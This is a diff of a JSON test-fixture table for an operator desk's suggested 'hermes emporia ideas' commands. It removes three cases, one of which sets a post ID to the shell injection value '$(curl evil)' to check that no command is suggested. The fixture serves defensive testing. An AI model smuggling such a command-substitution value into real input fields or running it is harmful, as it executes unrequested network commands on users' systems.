@@ -2,49 +2,6 @@
  "about": "The commands the operator's desk suggests. emporia/operator_desk.py and dashboard/src/operatorCommands.ts both reproduce this table (tests/test_operator.py, dashboard/src/operatorCommands.test.ts).",
  "cases": [
   {
-   "kind": "idea",
-   "name": "opdesk",
-   "verdicts": true,
-   "item": {
-    "post_id": "pst_0123456789ab"
-   },
-   "expect": [
-    {
-     "label": "adopt",
-     "command": "hermes emporia ideas opdesk adopt pst_0123456789ab --ref COMMIT_OR_ROADMAP_ITEM",
-     "gate": "person"
-    },
-    {
-     "label": "noted",
-     "command": "hermes emporia ideas opdesk noted pst_0123456789ab",
-     "gate": "person"
-    },
-    {
-     "label": "a duplicate",
-     "command": "hermes emporia ideas opdesk duplicate pst_0123456789ab --of EARLIER_POST",
-     "gate": "person"
-    }
-   ]
-  },
-  {
-   "kind": "idea",
-   "name": "opdesk",
-   "verdicts": false,
-   "item": {
-    "post_id": "pst_0123456789ab"
-   },
-   "expect": []
-  },
-  {
-   "kind": "idea",
-   "name": "opdesk",
-   "verdicts": true,
-   "item": {
-    "post_id": "$(curl evil)"
-   },
-   "expect": []
-  },
-  {
    "kind": "expedition",
    "name": "opdesk",
    "expect": [
